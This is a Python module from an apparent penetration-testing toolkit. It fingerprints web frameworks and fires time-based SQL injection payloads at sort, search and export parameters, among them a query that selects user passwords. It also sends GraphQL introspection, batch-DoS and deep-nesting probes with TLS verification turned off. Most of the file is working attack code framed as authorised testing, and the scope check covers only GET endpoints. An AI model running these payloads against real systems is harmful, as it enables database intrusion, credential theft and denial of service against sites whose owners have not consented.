from __future__ import annotations
import asyncio
import httpx
import logging
from typing import List, Dict, Optional, Literal
from pentkit.core.session import Session
from pentkit.core.logger import get_module_logger
from pentkit.core.rate_limiter import TokenBucket
from pentkit.core.scope_guard import ScopeGuard
from pentkit.core.ai_engine import AIEngine
from pentkit.modules.web.crawler import SiteMap
from pentkit.modules.web.timing_oracle import TimingOracle

logger = get_module_logger("web.orm_hunter")

class ORMRawQueryHunter:
    """
    Detects and exploits SQLi in ORM raw query escape hatches.
    Targets raw(), text(), $queryRaw, and literal() bypasses.
    """

    ORM_SIGNATURES = {
        "django": [
            "CSRF middleware",
            "csrfmiddlewaretoken",
            "django.core",
            "wsgi.errors",
        ],
        "rails": [
            "X-Request-Id",
            "rack.errors",
            "_rails_",
            "ActionDispatch",
        ],
        "laravel": [
            "laravel_session",
            "X-Powered-By: PHP",
            "XSRF-TOKEN",
        ],
        "express_sequelize": [
            "connect.sid",
            "X-Powered-By: Express",
        ],
        "spring": [
            "JSESSIONID",
            "X-Application-Context",
            "spring",
        ],
    }

    HIGH_RISK_PARAMS = {
        "search":       ["q", "query", "search", "keyword", "term", "filter"],
        "sort":         ["sort", "order", "orderby", "sort_by", "column"],
        "export":       ["export", "download", "report", "format"],
        "filter":       ["filter", "where", "condition", "field"],
        "aggregate":    ["group", "group_by", "aggregate", "sum", "count"],
    }

    def __init__(self, guard: ScopeGuard, bucket: TokenBucket, ai: AIEngine):
        self.guard = guard
        self.bucket = bucket
        self.ai = ai
        self.timing = TimingOracle()

    async def run(self, sitemap: SiteMap, session: Session):
        """Execute ORM-specific injection hunters."""
        logger.info(f"Starting ORM Hunter on {sitemap.target}")
        
        # Step 1: Fingerprint ORM
        orm = self._fingerprint_orm(sitemap)
        logger.info(f"Fingerprinted ORM: {orm or 'Unknown'}")

        # Step 2: Target high-risk endpoints
        for url in sitemap.endpoints:
            if not self.guard.is_safe(url):
                continue
                
            parsed = httpx.URL(url)
            for param, val in parsed.params.items():
                category = self._classify_param(param)
                if category:
                    await self._test_orm_escape(url, "GET", param, category, session)

        for form in sitemap.forms:
            for input_field in form['inputs']:
                param = input_field['name']
                category = self._classify_param(param)
                if category:
                    await self._test_orm_escape(form['action'], form['method'].upper(), param, category, session)

        # Step 3: GraphQL Specifics
        if any("/graphql" in url or "/gql" in url for url in sitemap.endpoints):
            gql_endpoint = next(url for url in sitemap.endpoints if "/graphql" in url or "/gql" in url)
            await self.detect_graphql_injection(gql_endpoint, session)

    def _fingerprint_orm(self, sitemap: SiteMap) -> Optional[str]:
        # Technology fingerprints from crawler
        for tech in sitemap.technologies:
            tech_lower = tech.lower()
            if "django" in tech_lower: return "django"
            if "rails" in tech_lower: return "rails"
            if "laravel" in tech_lower: return "laravel"
            if "spring" in tech_lower: return "spring"
            if "express" in tech_lower: return "express_sequelize"
        return None

    def _classify_param(self, param: str) -> Optional[str]:
        p_lower = param.lower()
        for cat, keywords in self.HIGH_RISK_PARAMS.items():
            if any(k in p_lower for k in keywords):
                return cat
        return None

    async def _test_orm_escape(self, url: str, method: str, param: str, category: str, session: Session):
        """Targeted ORM bypass payloads."""
        baseline = await self.timing.calibrate(url, param)
        if not baseline: return

        payloads = []
        if category == "sort":
            # Column-name injection (bypasses parameterisation)
            payloads = [
                "id ASC, (SELECT SLEEP(SLEEP_DUR))-- -",
                "id,(SELECT 1 FROM(SELECT SLEEP(SLEEP_DUR))a)-- -",
                "IF(1=1,SLEEP(SLEEP_DUR),0)"
            ]
        elif category == "search":
            # LIKE raw() bypass
            payloads = [
                "') OR SLEEP(SLEEP_DUR)-- -",
                "%) AND (SELECT 1 FROM (SELECT(SLEEP(SLEEP_DUR)))a)-- -",
            ]
        elif category == "export":
            # Field selection injection
            payloads = [
                "(SELECT password FROM users LIMIT 1)",
                "*, (SELECT SLEEP(SLEEP_DUR))"
            ]

        for payload in payloads:
            sleep_dur = self.timing.select_sleep(baseline)
            if sleep_dur == 0: continue
            
            result = await self.timing.test(url, method, param, payload, baseline, sleep_duration=sleep_dur)
            if result.triggered:
                session.add_finding(
                    module="web.orm_hunter",
                    target=url,
                    title=f"ORM Raw Query SQLi ({category})",
                    description=f"Confirmed SQL injection in ORM raw query escape hatch. {result.notes}",
                    severity="high",
                    payload=payload,
                    tags=["orm_raw_escape", "sqli", "active"]
                )

    async def detect_graphql_injection(self, endpoint: str, session: Session):
        """GraphQL-specific injection patterns."""
        async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
            # 1. Introspection abuse (__type)
            query = '{"query": "{__type(name:\\"User\\"){fields{name type{name}}}}"}'
            try:
                response = await client.post(endpoint, data=query, headers={"Content-Type": "application/json"})
                if response.status_code == 200 and "fields" in response.text:
                    session.add_finding(
                        module="web.orm_hunter", target=endpoint, title="GraphQL Introspection via __type",
                        description="Schematic information exposed via __type even if __schema is disabled.",
                        severity="medium", payload=query, tags=["graphql", "orm_raw_escape"]
                    )
            except Exception: pass

            # 2. Batch Query DoS
            batch_query = json.dumps([{"query": "{__typename}"}] * 50)
            start = time.perf_counter()
            try:
                response = await client.post(endpoint, data=batch_query, headers={"Content-Type": "application/json"})
                duration = time.perf_counter() - start
                if response.status_code == 200 and duration > 2.0:
                    session.add_finding(
                        module="web.orm_hunter", target=endpoint, title="GraphQL Batch Query DoS",
                        description="The server processes large query batches without adequate rate limiting.",
                        severity="medium", payload="Batch of 50 queries", tags=["graphql", "dos"]
                    )
            except Exception: pass

            # 3. Deep Query Nesting
            nested = "{user{" + "friends{" * 15 + "name" + "}" * 15 + "}}"
            query = json.dumps({"query": nested})
            try:
                response = await client.post(endpoint, data=query, headers={"Content-Type": "application/json"})
                if response.status_code == 200:
                    session.add_finding(
                        module="web.orm_hunter", target=endpoint, title="GraphQL Deep Query Nesting",
                        description="Server accepted a query nested 15 levels deep, indicating no depth limiting.",
                        severity="high", payload=nested, tags=["graphql", "dos"]
                    )
            except Exception: pass

import time
import json
from pentkit.modules.web.timing_oracle import TimingResult
__all__ = ["ORMRawQueryHunter"]
